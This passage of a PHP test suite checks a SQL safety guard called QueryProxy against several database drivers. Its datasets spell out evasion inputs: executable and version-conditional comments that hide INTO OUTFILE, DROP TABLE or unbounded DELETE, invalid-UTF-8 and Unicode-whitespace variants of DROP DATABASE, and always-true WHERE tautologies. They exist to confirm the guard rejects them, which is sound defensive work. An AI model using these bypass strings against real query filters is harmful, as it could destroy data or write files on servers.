    'sqlsrv, sp_executesql with parameters' => ["EXEC sp_executesql N'UPDATE t SET a = 1 WHERE id = @id', N'@id int', @id = 1", DbDriver::Sqlsrv],
    'sqlsrv, sp_executesql with a named @stmt and WHERE' => ["EXEC sp_executesql @stmt = N'DELETE FROM t WHERE id = 1'", DbDriver::Sqlsrv],
    'sqlsrv, EXEC of an N literal with WHERE' => ["EXEC(N'DELETE FROM t WHERE id = 1')", DbDriver::Sqlsrv],
    'pgsql, DELETE in a CTE with its own WITH and WHERE' => ['WITH d AS (WITH x AS (SELECT 1) DELETE FROM t WHERE id = 1 RETURNING *) SELECT * FROM d', DbDriver::Pgsql],
    'sqlsrv, module call' => ['EXEC dbo.my_proc 1', DbDriver::Sqlsrv],
    'sqlsrv, read through EXEC' => ["EXEC('SELECT 1')", DbDriver::Sqlsrv],
    'sqlsrv, WITH ... DELETE with WHERE' => ['WITH a AS (SELECT 1 AS x) DELETE FROM t WHERE id = 1', DbDriver::Sqlsrv],
    'pgsql, DELETE in a CTE with WHERE' => ['WITH d AS (DELETE FROM t WHERE id = 1 RETURNING *) SELECT * FROM d', DbDriver::Pgsql],
    'pgsql, PREPARE ... AS with WHERE' => ['PREPARE s (int) AS DELETE FROM t WHERE id = $1', DbDriver::Pgsql],
    'mysql, PREPARE ... FROM with WHERE' => ["BEGIN; PREPARE s FROM 'DELETE FROM t WHERE id = 1'; EXECUTE s; COMMIT;", DbDriver::Mysql],
    'mysql, EXECUTE IMMEDIATE with WHERE' => ["EXECUTE IMMEDIATE 'DELETE FROM t WHERE id = ?' USING 1", DbDriver::Mysql],
]);

test('dynamic SQL nests up to the depth limit', function () {
    $atLimit = inspect("EXEC('EXEC(''EXEC(''''SELECT 1'''')'')')", DbDriver::Sqlsrv);
    $pastLimit = inspect("EXEC('EXEC(''EXEC(''''EXEC(''''''''SELECT 1'''''''')'''')'')')", DbDriver::Sqlsrv);

    expect($atLimit->violations)->toBe([])
        ->and($pastLimit->violations)->toContain('Statement 1: statements nested more than 3 levels deep are not allowed.');
});

test('WITH clauses inside CTE bodies nest up to the depth limit', function () {
    $atLimit = inspect('WITH a AS (WITH b AS (WITH c AS (WITH e AS (SELECT 1) SELECT 1) SELECT 1) SELECT 1) SELECT * FROM a', DbDriver::Pgsql);
    $pastLimit = inspect('WITH a AS (WITH b AS (WITH c AS (WITH e AS (WITH f AS (SELECT 1) SELECT 1) SELECT 1) SELECT 1) SELECT 1) SELECT * FROM a', DbDriver::Pgsql);

    expect($atLimit->violations)->toBe([])
        ->and($atLimit->type())->toBe(StatementType::Read)
        ->and($pastLimit->violations)->toContain('Statement 1: statements nested more than 3 levels deep are not allowed.');
});

test('read-only WITH clauses and exec as a name keep passing as reads', function (string $sql, DbDriver $driver) {
    $result = inspect($sql, $driver);

    expect($result->violations)->toBe([])
        ->and($result->type())->toBe(StatementType::Read);
})->with([
    'sqlsrv, XMLNAMESPACES' => ["WITH XMLNAMESPACES ('uri' AS ns) SELECT 1", DbDriver::Sqlsrv],
    'sqlsrv, bracketed CTE name' => ['WITH [a] AS (SELECT 1) SELECT * FROM a', DbDriver::Sqlsrv],
    'pgsql, NOT MATERIALIZED' => ['WITH a AS NOT MATERIALIZED (SELECT 1) SELECT * FROM a', DbDriver::Pgsql],
    'pgsql, SEARCH and CYCLE' => ['WITH RECURSIVE r(n) AS (SELECT 1 UNION ALL SELECT n + 1 FROM r WHERE n < 5) SEARCH DEPTH FIRST BY n SET ord CYCLE n SET is_cycle USING path SELECT * FROM r', DbDriver::Pgsql],
    'pgsql, CTE with its own read-only WITH' => ['WITH d AS (WITH x AS (SELECT 1) SELECT * FROM x) SELECT * FROM d', DbDriver::Pgsql],
    'pgsql, exec as a function name' => ['SELECT exec(a) FROM t', DbDriver::Pgsql],
]);

// --- MariaDB executable comments ("/*M!...*/") ---

dataset('mariadb executable comment bypasses', [
    'INTO OUTFILE' => 'SELECT 1 /*M!100000 INTO OUTFILE "/tmp/x" */',
    'ANALYZE DELETE without WHERE' => 'ANALYZE /*M!100000 DELETE FROM t*/',
    'ANALYZE DROP TABLE' => 'ANALYZE /*M!100000 DROP TABLE t*/',
    'no version' => 'SELECT 1 /*M! INTO OUTFILE "/tmp/x" */',
    'version MariaDB skips on "/*!"' => 'SELECT 1 /*M!50700 INTO OUTFILE "/tmp/x" */',
    'nested inside another one' => 'SELECT 1 /*M! , 2 /*M!100000 INTO OUTFILE "/tmp/x" */ */',
    'inside a MySQL executable comment' => 'SELECT 1 /*!50000 , 2 /*M!100000 INTO OUTFILE "/tmp/x" */ */',
    'behind a multibyte literal' => "SELECT 'ééé' /*M!100000 INTO OUTFILE '/tmp/x' */",
    'behind a multibyte comment' => 'ANALYZE /* éé */ /*M!100000 DROP TABLE t*/',
]);

test('a MariaDB executable comment cannot hide code from the guard', function (string $sql) {
    expect(inspect($sql, DbDriver::Mariadb)->passes())->toBeFalse();
})->with('mariadb executable comment bypasses');

test('a MariaDB executable comment is rejected when the driver is unknown', function (string $sql) {
    expect(inspect($sql)->passes())->toBeFalse();
})->with('mariadb executable comment bypasses');

test('a MariaDB executable comment widening a WHERE clause is judged like the plain clause', function () {
    $commented = inspect('UPDATE t SET a = 1 WHERE id = 1 /*M! OR 1 = 1 */', DbDriver::Mariadb);
    $plain = inspect('UPDATE t SET a = 1 WHERE id = 1  OR 1 = 1', DbDriver::Mariadb);

    expect($commented->violations)->toBe($plain->violations)
        ->and($commented->type())->toBe($plain->type())
        ->and(inspect('UPDATE t SET a = 1 WHERE id = 1 /*M! OR 1 = 1 */')->passes())->toBeFalse();
});

test('a harmless MariaDB executable comment passes and is classified by its body', function (string $sql, StatementType $type) {
    $result = inspect($sql, DbDriver::Mariadb);

    expect($result->violations)->toBe([])
        ->and($result->type())->toBe($type);
})->with([
    'extra column' => ['SELECT 1 /*M!100000 , 2 */', StatementType::Read],
    'state-changing call' => ['SELECT 1 /*M!100000 , SLEEP(1) */', StatementType::Write],
]);

test('a MariaDB executable comment keeps its meaning to the server', function (string $sql, string $prepared) {
    expect(inspect($sql, DbDriver::Mariadb)->preparedSql())->toBe($prepared);
})->with([
    'six-digit version' => ['SELECT 1 /*M!100000 , 2 */', "SELECT 1 /*!100000  , 2 */\nLIMIT 1000"],
    'five-digit version' => ['SELECT 1 /*M!50600 , 2 */', "SELECT 1 /*!50600  , 2 */\nLIMIT 1000"],
    'version MariaDB skips on "/*!"' => ['SELECT 1 /*M!50700 , 2 */', "SELECT 1 /*!       , 2 */\nLIMIT 1000"],
    'six-digit spelling of a version MariaDB skips on "/*!"' => ['SELECT 1 /*M!060000 , 2 */', "SELECT 1 /*!        , 2 */\nLIMIT 1000"],
    'digit after the version stays code' => ['SELECT 1 /*M!1234567 */', "SELECT 1 /*!123456 7 */\nLIMIT 1000"],
    'short number is code, not a version' => ['SELECT 1 /*M!2*/', "SELECT 1 /*! 2*/\nLIMIT 1000"],
]);

test('"/*M!" inside a string literal is left alone', function () {
    $result = inspect("SELECT '/*M! INTO OUTFILE */' FROM t", DbDriver::Mariadb);

    expect($result->violations)->toBe([])
        ->and($result->preparedSql())->toContain("'/*M! INTO OUTFILE */'");
});

test('a "/*M!" comment stays a plain comment on MySQL', function (string $sql, StatementType $type) {
    $result = inspect($sql, DbDriver::Mysql);

    expect($result->violations)->toBe([])
        ->and($result->type())->toBe($type)
        ->and($result->preparedSql())->toContain('/*M!');
})->with([
    'INTO OUTFILE' => ['SELECT 1 /*M!100000 INTO OUTFILE "/tmp/x" */', StatementType::Read],
    'widened WHERE' => ['UPDATE t SET a = 1 WHERE id = 1 /*M! OR 1 = 1 */', StatementType::Write],
    'ANALYZE DELETE' => ['ANALYZE /*M!100000 DELETE FROM t*/', StatementType::Write],
    'ANALYZE DROP TABLE' => ['ANALYZE /*M!100000 DROP TABLE t*/', StatementType::Write],
    'harmless body' => ['SELECT 1 /*M!100000 , SLEEP(1) */', StatementType::Read],
]);

test('a "/*M!" body is a comment on MySQL and a statement on MariaDB', function () {
    $sql = 'SELECT 1 /*M! ; DELETE FROM t */';

    $mysql = inspect($sql, DbDriver::Mysql);
    $mariadb = inspect($sql, DbDriver::Mariadb);

    expect($mysql->violations)->toBe([])
        ->and($mysql->statements)->toHaveCount(1)
        ->and($mysql->type())->toBe(StatementType::Read)
        ->and($mysql->preparedSql())->toContain('/*M! ; DELETE FROM t */')
        ->and($mariadb->statements)->toHaveCount(2)
        ->and($mariadb->violations)->toContain('Statement 2: DELETE without a WHERE clause is not allowed.');
});

test('a MariaDB executable comment that is never closed is rejected', function (string $sql, ?DbDriver $driver) {
    expect(inspect($sql, $driver)->violations)->toBe(['A block comment that is never closed is not allowed.']);
})->with([
    'mariadb, with a body' => ['SELECT 1 /*M!100000 , 2', DbDriver::Mariadb],
    'mariadb, bare opener' => ['SELECT 1 /*M!100000', DbDriver::Mariadb],
    'mariadb, nested opener' => ['SELECT 1 /*M! , 2 /*M!100000 , 3 */', DbDriver::Mariadb],
    'mysql, bare opener' => ['SELECT 1 /*M!100000', DbDriver::Mysql],
    'unknown driver' => ['SELECT 1 /*M!100000 , 2', null],
]);

// --- Version-conditional comments ("/*!NNNNN ... */", "/*M!NNNNNN ... */") ---

dataset('version-conditional comment bypasses', [
    'mariadb, DELETE WHERE in a skipped "/*M!"' => ['DELETE FROM t /*M!999999 WHERE id = 1 */', DbDriver::Mariadb],
    'unknown driver, DELETE WHERE in a skipped "/*M!"' => ['DELETE FROM t /*M!999999 WHERE id = 1 */', null],
    'mariadb, UPDATE WHERE in a skipped "/*M!"' => ['UPDATE t SET a = 1 /*M!120000 WHERE id = 1 */', DbDriver::Mariadb],
    'mariadb, inside a transaction' => ['BEGIN; DELETE FROM t /*M!999999 WHERE id = 1 */; COMMIT;', DbDriver::Mariadb],
    'mariadb, LIMIT in a skipped "/*M!"' => ['SELECT * FROM t /*M!999999 LIMIT 1 */', DbDriver::Mariadb],
    'mariadb, nested "/*M!"' => ['UPDATE t SET a = 1 /*M!999999 /*M! WHERE id = 1 */ */', DbDriver::Mariadb],
    'mysql, DELETE WHERE in a skipped "/*!"' => ['DELETE FROM t /*!99999 WHERE id = 1 */', DbDriver::Mysql],
    'mariadb, "/*!" MariaDB always skips' => ['DELETE FROM t /*!60000 WHERE id = 1 */', DbDriver::Mariadb],
    'mysql, clamped LIMIT in a skipped "/*!"' => ['SELECT * FROM t /*!99999 LIMIT 5000 */', DbDriver::Mysql],
    'mysql, different versions' => ['SELECT 1 /*!40101 , 2 */ FROM t /*!50000 WHERE 1 = 1 */', DbDriver::Mysql],
    'mysql, six-digit version' => ['SELECT 1 /*!100000 , 2 */', DbDriver::Mysql],
    'mariadb, seven-digit version' => ['SELECT 1 /*!1000000 , 2 */', DbDriver::Mariadb],
    'mysql, "*/" inside a string in the body' => ["DELETE FROM t /*!50000 WHERE a = '*/' */", DbDriver::Mysql],
    'mysql, comment inside the body' => ['DELETE FROM t /*!50000 WHERE id = 1 /* x */ */', DbDriver::Mysql],
    'mysql, never closed' => ['SELECT 1 /*!50000 , 2', DbDriver::Mysql],
    'mysql, dynamic SQL' => ["PREPARE s FROM 'DELETE FROM t /*!99999 WHERE id = 1 */'", DbDriver::Mysql],
    'mariadb, "/*M!" nested too deep' => ['SELECT 1 /*M! /*M! /*M! /*M! , 2 */ */ */ */', DbDriver::Mariadb],
    'unknown driver, "/*M!" inside "$$"' => ["SELECT a $$ /*M! , b INTO OUTFILE '/tmp/x' */ FROM t ORDER BY $$", null],
]);

test('a version-conditional comment the server may skip cannot hide a clause from the guard', function (string $sql, ?DbDriver $driver) {
    expect(inspect($sql, $driver)->passes())->toBeFalse();
})->with('version-conditional comment bypasses');

test('a version-conditional comment that reads the same run or skipped passes as written', function (string $sql, DbDriver $driver, string $prepared) {
    $result = inspect($sql, $driver);

    expect($result->violations)->toBe([])
        ->and($result->preparedSql())->toBe($prepared);
})->with([
    'mysql, extra column' => ['SELECT 1 /*!50000 , 2 */ FROM t', DbDriver::Mysql, "SELECT 1 /*!50000 , 2 */ FROM t\nLIMIT 1000"],
    'mysql, same version twice' => ['SELECT 1 /*!50000 , 2 */ FROM t /*!50000 WHERE 1 = 1 */', DbDriver::Mysql, "SELECT 1 /*!50000 , 2 */ FROM t /*!50000 WHERE 1 = 1 */\nLIMIT 1000"],
    'mysql, extra LIMIT on a DELETE with WHERE' => ['DELETE FROM t WHERE id = 1 /*!50000 LIMIT 5 */', DbDriver::Mysql, 'DELETE FROM t WHERE id = 1 /*!50000 LIMIT 5 */'],
    'mariadb, extra column' => ['SELECT 1 /*!100000 , 2 */', DbDriver::Mariadb, "SELECT 1 /*!100000 , 2 */\nLIMIT 1000"],
]);

test('many MariaDB executable comments are resolved in linear time', function (string $comment) {
    $elapsed = function (string $sql): float {
        $best = INF;

        foreach (range(1, 3) as $run) {
            $start = hrtime(true);
            inspect($sql, DbDriver::Mariadb);
            $best = min($best, (hrtime(true) - $start) / 1e9);
        }

        return $best;
    };

    $count = 5000;
    $baseline = $elapsed('SELECT 1 '.str_repeat('/*!*/', $count));

    expect($elapsed('SELECT 1 '.str_repeat($comment, $count)))->toBeLessThan($baseline * 5 + 0.5);
})->with([
    'unversioned' => '/*M!*/',
    'versioned' => '/*M!100000*/',
]);

test('a maximum-size SQLite or SQL Server statement full of strings and comments is lexed in linear time', function (DbDriver $driver, string $unit) {
    // As many server ranges and lexer tokens as the 65535-byte input limit
    // allows: every token used to be held against every range, so a quarter
    // of the input took about a sixteenth of the time instead of a quarter.
    $statement = fn (int $bytes): string => 'SELECT 1 '.str_repeat($unit, intdiv($bytes - 9, strlen($unit)));
    $passes = true;
    $elapsed = function (string $sql) use ($driver, &$passes): float {
        $best = INF;

        // Tens of thousands of short-lived lexer tokens would otherwise trigger
        // fruitless cycle collections that keep raising the collector's
        // threshold for the rest of the suite, letting garbage pile up past
        // memory_limit. Their freed memory is then returned to the
        // system, so it does not stay fragmented for the tests that follow.
        gc_disable();

        try {
            foreach (range(1, 3) as $run) {
                $start = hrtime(true);
                $passes = inspect($sql, $driver)->passes() && $passes;
                $best = min($best, (hrtime(true) - $start) / 1e9);
            }
        } finally {
            gc_enable();
            gc_collect_cycles();
            gc_mem_caches();
        }

        return $best;
    };

    $baseline = $elapsed($statement(intdiv(65535, 4)));
    $maximum = $elapsed($statement(65535));

    expect($passes)->toBeTrue()
        ->and($maximum)->toBeLessThan($baseline * 8 + 0.5);
})->with([
    'sqlite, block comments' => [DbDriver::Sqlite, '/**/'],
    'sqlite, strings between comments' => [DbDriver::Sqlite, ",''/**/"],
    'sqlite, multibyte comments' => [DbDriver::Sqlite, '/*é*/'],
    'sqlsrv, block comments' => [DbDriver::Sqlsrv, '/**/'],
    'sqlsrv, strings between comments' => [DbDriver::Sqlsrv, ",''/**/"],
    'sqlsrv, comments holding a temporary table marker' => [DbDriver::Sqlsrv, '/*#*/'],
]);

test('the byte offsets of a maximum-size SQLite or SQL Server batch of delimiters after multibyte text are measured once', function (DbDriver $driver) {
    // Every delimiter's character position is turned into a byte offset; with
    // one multibyte character ahead of them, re-measuring the prefix for each
    // delimiter made an eighth of the input take about a sixty-fourth of the
    // time instead of an eighth.
    $statement = fn (int $bytes): string => 'SELECT 1 /*é*/'.str_repeat(';', $bytes - 15);
    $passes = true;
    $elapsed = function (string $sql) use ($driver, &$passes): float {
        $best = INF;

        // See the linear-time lexing test above.
        gc_disable();

        try {
            foreach (range(1, 3) as $run) {
                $start = hrtime(true);
                $passes = inspect($sql, $driver)->passes() && $passes;
                $best = min($best, (hrtime(true) - $start) / 1e9);
            }
        } finally {
            gc_enable();
            gc_collect_cycles();
            gc_mem_caches();
        }

        return $best;
    };

    $baseline = $elapsed($statement(intdiv(65535, 8)));
    $maximum = $elapsed($statement(65535));

    expect($passes)->toBeTrue()
        ->and($maximum)->toBeLessThan($baseline * 16 + 0.5);
})->with([
    'sqlite' => [DbDriver::Sqlite],
    'sqlsrv' => [DbDriver::Sqlsrv],
]);

test('a maximum-size SQLite or SQL Server request is lexed about once', function (DbDriver $driver, string $prefix, string $unit, string $suffix) {
    // Every pipeline step used to run its own lexer over the request, and the
    // lexer and parser kept an exception with a stack trace for every token
    // they could not read: a request of "[a]," names took seconds and ran a
    // SQLite worker out of memory. The tokens are now lexed once per request
    // text and shared by every step.
    $sql = $prefix.str_repeat($unit, intdiv(65535 - strlen($prefix) - strlen($suffix), strlen($unit))).$suffix;
    $inspector = new class extends SqlInspector
    {
        /** @var list<string> */
        public array $lexed = [];

        protected function lex(string $sql): array
        {
            $this->lexed[] = $sql;

            return parent::lex($sql);
        }
    };

    // See the linear-time lexing test above. The collector stays off for the
    // whole test as well: tens of thousands of live tokens would otherwise
    // fill its root buffer to no avail and raise its threshold for every
    // test that runs after this one.
    gc_disable();

    try {
        gc_collect_cycles();
        memory_reset_peak_usage();
        $memory = memory_get_usage();
        $passes = $inspector->inspect($sql, $driver)->passes();
        $peak = memory_get_peak_usage() - $memory;
        // Guards the cycle break in analyzeStatement() ("$parser->errors =
        // []"): the exception the parser keeps for its first error holds a
        // backtrace through the parser to every token, so without the break
        // the whole parse tree is left behind as cyclic garbage, which the
        // collector, its threshold raised by these tokens, would keep long
        // after the request.
        $garbage = gc_collect_cycles();
    } finally {
        gc_enable();
        gc_collect_cycles();
        gc_mem_caches();
    }

    // Stripping comments or splitting a transaction hands the checks a second
    // text, which is lexed once in turn: no text may be lexed twice.
    expect($passes)->toBeTrue()
        ->and($inspector->lexed)->toHaveCount(count(array_unique($inspector->lexed)))
        ->and(count($inspector->lexed))->toBeLessThanOrEqual(2)
        ->and($peak)->toBeLessThan(64 * 1024 * 1024)
        ->and($garbage)->toBe(0);
})->with([
    'sqlite, bracketed names' => [DbDriver::Sqlite, 'SELECT ', '[a],', '1'],
    'sqlite, line comments' => [DbDriver::Sqlite, 'SELECT 1 ', "--\n", ''],
    'sqlite, statements in a transaction' => [DbDriver::Sqlite, 'BEGIN;', 'SELECT 1;', 'COMMIT;'],
    'sqlite, strings, names and comments' => [DbDriver::Sqlite, 'SELECT 1', ",'a',[b]/**/", ''],
    'sqlsrv, bracketed names' => [DbDriver::Sqlsrv, 'SELECT ', '[a],', '1'],
    'sqlsrv, line comments' => [DbDriver::Sqlsrv, 'SELECT 1 ', "--\n", ''],
    'sqlsrv, statements in a transaction' => [DbDriver::Sqlsrv, 'BEGIN;', 'SELECT 1;', 'COMMIT;'],
    'sqlsrv, strings, names and comments' => [DbDriver::Sqlsrv, 'SELECT 1', ",'a',[b]/**/", ''],
]);

dataset('invalid utf-8 bypasses', [
    'bad byte in a block comment' => ["DROP DATABASE prod /* \xC3\xA9\xFF */"],
    'bad byte in a string literal' => ["DROP DATABASE prod; SELECT '\xC3\xA9\xFF'"],
    'bad byte in an identifier' => ["DROP DATABASE prod\xC3\xA9\xFF"],
    'lone bad byte' => ["DROP DATABASE prod \xFF"],
    'lone bad byte in a comment' => ["DROP DATABASE prod /* \xFF */"],
    'truncated sequence' => ["DROP DATABASE prod /* \xC3 */"],
    'truncated sequence in a line comment' => ["DELETE FROM t -- \xE2\x80"],
    'overlong encoding' => ["DROP DATABASE prod /* \xC0\xAF */"],
    'overlong encoding in a string literal' => ["SELECT '\xC0\xAF'"],
    'bad byte in a comment-only request' => ["/* \xFF */"],
]);

dataset('every driver', [
    'pgsql' => [DbDriver::Pgsql],
    'mysql' => [DbDriver::Mysql],
    'mariadb' => [DbDriver::Mariadb],
    'sqlsrv' => [DbDriver::Sqlsrv],
    'sqlite' => [DbDriver::Sqlite],
    'unknown driver' => [null],
]);

test('SQL that is not valid UTF-8 is rejected before the lexer reads it', function (string $sql, ?DbDriver $driver) {
    $result = inspect($sql, $driver);

    expect($result->passes())->toBeFalse()
        ->and($result->violations)->toBe(['SQL must be valid UTF-8.']);
})->with('invalid utf-8 bypasses')->with('every driver');

test('valid multibyte content passes and stays a read', function (?DbDriver $driver) {
    $result = inspect("SELECT 'é ğ 🙂' AS x", $driver);

    expect($result->violations)->toBe([])
        ->and($result->type())->toBe(StatementType::Read);
})->with('every driver');

test('empty, blank and comment-only input keeps its rejection', function (string $sql, ?DbDriver $driver) {
    expect(inspect($sql, $driver)->violations)->toBe(['No executable SQL statement found.']);
})->with([
    'empty' => [''],
    'blank' => ["   \n\t "],
    'line comment' => ['-- just a comment'],
    'block comment' => ['/* block */'],
    'multibyte comment' => ['/* é ğ 🙂 */'],
])->with('every driver');

test('splitStatements refuses text the lexer cannot read', function (string $sql) {
    app(SqlInspector::class)->splitStatements($sql);
})->with('invalid utf-8 bypasses')->throws(InvalidArgumentException::class, 'SQL must be valid UTF-8.');

test('splitStatements still reads blank and comment-only text as no statement', function (string $sql) {
    expect(app(SqlInspector::class)->splitStatements($sql))->toBe([]);
})->with(['', '   ', '-- just a comment', '/* é */']);

test('text the lexer returns no token for is unreadable, not empty', function (string $sql, ?string $violation) {
    // The lexer reads all valid UTF-8, so the defence behind the encoding
    // check is driven directly with the token list a failed lexing leaves.
    $unreadable = new ReflectionMethod(SqlInspector::class, 'unreadableTextViolation');

    expect($unreadable->invoke(app(SqlInspector::class), $sql, [new Token('', TokenType::Delimiter)]))
        ->toBe($violation);
})->with([
    'statement' => ['DROP DATABASE prod', 'QueryProxy could not read this SQL: the lexer found no statement in text that is not empty.'],
    'blank' => ['   ', null],
    'comment only' => ['/* x */', null],
]);

dataset('always-true where clauses', [
    'UPDATE ... WHERE 1=1' => ['UPDATE t SET a=1 WHERE 1=1', 'UPDATE'],
    'DELETE ... WHERE true' => ['DELETE FROM t WHERE true', 'DELETE'],
    'DELETE ... OR 1=1' => ['DELETE FROM t WHERE id=1 OR 1=1', 'DELETE'],
    'UPDATE ... WHERE ((\'x\'=\'x\'))' => ["UPDATE t SET a=1 WHERE (('x'='x'))", 'UPDATE'],
]);

test('an always-true WHERE clause counts as missing on every driver', function (string $sql, string $verb, ?DbDriver $driver) {
    $result = inspect($sql, $driver);

    expect($result->passes())->toBeFalse()
        ->and($result->violations)->toContain("Statement 1: {$verb} with an always-true WHERE clause is not allowed.");
})->with('always-true where clauses')->with('every driver');

test('literal tautologies are recognised as always true', function (string $where) {
    expect(inspect("DELETE FROM t WHERE {$where}")->violations)
        ->toContain('Statement 1: DELETE with an always-true WHERE clause is not allowed.');
})->with([
    '1 = 1', "'a'='a'", '1<>2', '2>1', 'TRUE', '1', 'not false', 'NOT 0', '1 IS NOT NULL',
    'NULL IS NULL', '((1=1))', '1=1 AND true', 'id = 1 OR (2 > 1 AND true)', 'NULL <=> NULL',
    '1 = 1 IS TRUE', 'NULL IS NOT TRUE', 'id = 1 || 1 = 1', '1=1 && 2=2',
]);

test('an always-true WHERE clause is caught on the paths that judge an inner statement', function (string $sql, ?DbDriver $driver, string $violation) {
    expect(inspect($sql, $driver)->violations)->toContain($violation);
})->with([
    'mariadb, executable comment' => ['UPDATE t SET a=1 WHERE id=1 /*M! OR 1=1 */', DbDriver::Mariadb, 'Statement 1: UPDATE with an always-true WHERE clause is not allowed.'],
    'pgsql, DML inside a CTE' => ['WITH x AS (DELETE FROM t WHERE 1=1 RETURNING *) SELECT * FROM x', DbDriver::Pgsql, 'Statement 1: DELETE with an always-true WHERE clause is not allowed.'],
    'pgsql, EXPLAIN ANALYZE' => ['EXPLAIN ANALYZE DELETE FROM t WHERE 1=1', DbDriver::Pgsql, 'Statement 1: DELETE with an always-true WHERE clause is not allowed.'],
    'pgsql, WITH ... DELETE' => ['WITH a AS (SELECT 1) DELETE FROM t WHERE true RETURNING *', DbDriver::Pgsql, 'Statement 1: DELETE with an always-true WHERE clause is not allowed.'],
    'mariadb, ANALYZE' => ['ANALYZE DELETE FROM t WHERE 1=1', DbDriver::Mariadb, 'Statement 1: DELETE with an always-true WHERE clause is not allowed.'],
    'sqlsrv, batch' => ['SELECT 1 DELETE FROM t WHERE 1=1', DbDriver::Sqlsrv, 'Statement 1: DELETE with an always-true WHERE clause is not allowed.'],
    'sqlsrv, EXEC literal' => ["EXEC('UPDATE t SET a = 1 WHERE 1 = 1')", DbDriver::Sqlsrv, 'Statement 1: UPDATE with an always-true WHERE clause is not allowed.'],
    'mysql, ORDER BY and LIMIT after the clause' => ['DELETE FROM t WHERE 1=1 ORDER BY id LIMIT 5', DbDriver::Mysql, 'Statement 1: DELETE with an always-true WHERE clause is not allowed.'],
]);

test('a WHERE clause with a real condition passes', function (string $sql, ?DbDriver $driver) {
    $result = inspect($sql, $driver);

    expect($result->passes())->toBeTrue()
        ->and($result->type())->toBe(StatementType::Write);
})->with([
    'DELETE FROM t WHERE id=1',
    'UPDATE t SET a=1 WHERE 1=1 AND id=5',
    'UPDATE t SET a=1 WHERE 1=0 OR id=5',
    'DELETE FROM t WHERE false',
    'DELETE FROM t WHERE NULL = NULL',
    "DELETE FROM t WHERE 'a'='b'",
    'DELETE FROM t WHERE id BETWEEN 1 AND 5',
    'UPDATE t SET a = (SELECT 1 FROM u WHERE 1=1) WHERE id = 2',
    // a = a is false where a is NULL, so it is not always true.
    'DELETE FROM t WHERE a=a',
])->with('every driver');

test('a WHERE clause too deeply nested to evaluate is refused, not exhausting memory', function (?DbDriver $driver) {
    // 1000 nested ORs (~10 KB) once copied the token list at every level
    // and exhausted a 128M memory_limit with a fatal error.
    $sql = 'DELETE FROM t WHERE '.str_repeat('(id=1 OR ', 1000).'id=2'.str_repeat(')', 1000);

    $result = inspect($sql, $driver);

    expect($result->passes())->toBeFalse()
        ->and($result->violations)->toContain('Statement 1: DELETE with a WHERE clause too complex to verify is not allowed.');
})->with('every driver');

test('a moderately nested or long WHERE clause is still evaluated', function () {
    $nested = str_repeat('(id=1 OR ', 30).'id=2'.str_repeat(')', 30);
    $list = implode(',', range(1, 5000));

    expect(inspect("DELETE FROM t WHERE {$nested}")->passes())->toBeTrue()
        ->and(inspect("DELETE FROM t WHERE {$nested} OR 1=1")->violations)
        ->toContain('Statement 1: DELETE with an always-true WHERE clause is not allowed.')
        ->and(inspect("DELETE FROM t WHERE a=1 AND (b=2 OR (c=3 AND id IN ({$list})))")->passes())->toBeTrue();
});

test('TRUE and FALSE compared or tested on SQL Server may name a column and pass', function (string $sql) {
    expect(inspect($sql, DbDriver::Sqlsrv)->passes())->toBeTrue();
})->with([
    'DELETE FROM t WHERE true IS NOT NULL',
    'DELETE FROM t WHERE false IS NOT NULL',
    'DELETE FROM t WHERE true = true',
    'DELETE FROM t WHERE (true) = 1',
]);

test('TRUE and FALSE compared or tested stay constants outside SQL Server', function () {
    expect(inspect('DELETE FROM t WHERE true IS NOT NULL', DbDriver::Pgsql)->violations)
        ->toContain('Statement 1: DELETE with an always-true WHERE clause is not allowed.')
        ->and(inspect('DELETE FROM t WHERE true = true', DbDriver::Mysql)->violations)
        ->toContain('Statement 1: DELETE with an always-true WHERE clause is not allowed.');
});

dataset('unicode whitespace bypasses', [
    'byte-order mark before DROP' => ["\u{FEFF}DROP DATABASE prod"],
    'no-break space between DELETE and FROM' => ["DELETE\u{00A0}FROM t"],
    'ideographic space before WHERE' => ["UPDATE t SET a=1\u{3000}WHERE id=1"],
    'no-break space in a name' => ["SELECT a\u{00A0}b FROM t"],
]);

dataset('unicode whitespace characters', [
    'U+FEFF' => ["\u{FEFF}"],
    'U+0085' => ["\u{0085}"],
    'U+00A0' => ["\u{00A0}"],
    'U+1680' => ["\u{1680}"],
    'U+180E' => ["\u{180E}"],
    'U+2000' => ["\u{2000}"],
    'U+2001' => ["\u{2001}"],
    'U+2002' => ["\u{2002}"],
    'U+2003' => ["\u{2003}"],
    'U+2004' => ["\u{2004}"],
    'U+2005' => ["\u{2005}"],
    'U+2006' => ["\u{2006}"],
    'U+2007' => ["\u{2007}"],
    'U+2008' => ["\u{2008}"],
    'U+2009' => ["\u{2009}"],
    'U+200A' => ["\u{200A}"],
    'U+200B' => ["\u{200B}"],
    'U+2028' => ["\u{2028}"],
    'U+2029' => ["\u{2029}"],
    'U+202F' => ["\u{202F}"],
    'U+205F' => ["\u{205F}"],
    'U+3000' => ["\u{3000}"],
]);

test('a byte-order mark or Unicode whitespace outside strings and comments is rejected', function (string $sql, ?DbDriver $driver) {
    $result = inspect($sql, $driver);

    expect($result->passes())->toBeFalse()
        ->and($result->violations)->toBe(['SQL must not contain Unicode whitespace or byte-order marks outside string literals, quoted identifiers and comments.']);
})->with('unicode whitespace bypasses')->with('every driver');

test('every Unicode whitespace character between tokens is rejected', function (string $char, ?DbDriver $driver) {
    $result = inspect("DELETE{$char}FROM t", $driver);

    expect($result->passes())->toBeFalse()
        ->and($result->violations)->toBe(['SQL must not contain Unicode whitespace or byte-order marks outside string literals, quoted identifiers and comments.']);
})->with('unicode whitespace characters')->with('every driver');

test('Unicode whitespace inside strings and comments stays a read', function (string $sql, ?DbDriver $driver) {
    $result = inspect($sql, $driver);

    expect($result->violations)->toBe([])
        ->and($result->type())->toBe(StatementType::Read);
})->with([
    'string literal' => ["SELECT '\u{FEFF}a\u{00A0}b' AS x"],
    'block comment' => ["SELECT 1 /* \u{FEFF}\u{3000} */"],
    'line comment' => ["SELECT 1 -- \u{2028}\u{00A0}\n"],
])->with('every driver');

test('Unicode whitespace inside a quoted name stays a read', function (string $sql, ?DbDriver $driver) {
    $result = inspect($sql, $driver);

    expect($result->violations)->toBe([])
        ->and($result->type())->toBe(StatementType::Read);
})->with([
    'double-quoted name on pgsql' => ["SELECT 1 AS \"a\u{00A0}b\"", DbDriver::Pgsql],
    'backtick name on mysql' => ["SELECT 1 AS `a\u{00A0}b`", DbDriver::Mysql],
    'backtick name on mariadb' => ["SELECT 1 AS `a\u{FEFF}b`", DbDriver::Mariadb],
    'bracketed name on sqlsrv' => ["SELECT 1 AS [a\u{00A0}b]", DbDriver::Sqlsrv],
